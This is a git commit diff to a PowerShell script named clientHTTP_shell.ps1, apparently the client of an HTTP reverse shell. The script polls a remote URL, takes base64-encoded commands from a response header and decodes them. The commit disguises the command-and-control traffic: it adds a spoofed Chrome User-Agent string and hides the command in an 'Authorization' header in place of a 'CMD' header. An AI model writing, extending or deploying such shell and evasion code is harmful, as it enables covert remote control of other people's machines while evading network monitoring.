e5569120b8fceb9fe4ab169e555359b39c8a953d
3v4Si0N <hector.de.armas.hda@gmail.com>
2020-03-28 19:41:54 +0100

    Update clientHTTP_shell.ps1

--- clientHTTP_shell.ps1
+++ clientHTTP_shell.ps1
@@ -7,8 +7,8 @@ while (1 -eq 1)
     try
     {
         #$req = Invoke-WebRequest $url  -Proxy $proxy -Method POST -Body $postParams;
-        $req = Invoke-WebRequest $url -Method POST -Body $postParams;
-        $header = $req.Headers["CMD"];
+        $req = Invoke-WebRequest $url -Method POST -Body $postParams -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
+        $header = $req.Headers["Authorization"];
         $d = [System.Convert]::FromBase64String($header);
         $Ds = [System.Text.Encoding]::UTF8.GetString($d);
         $result = "";
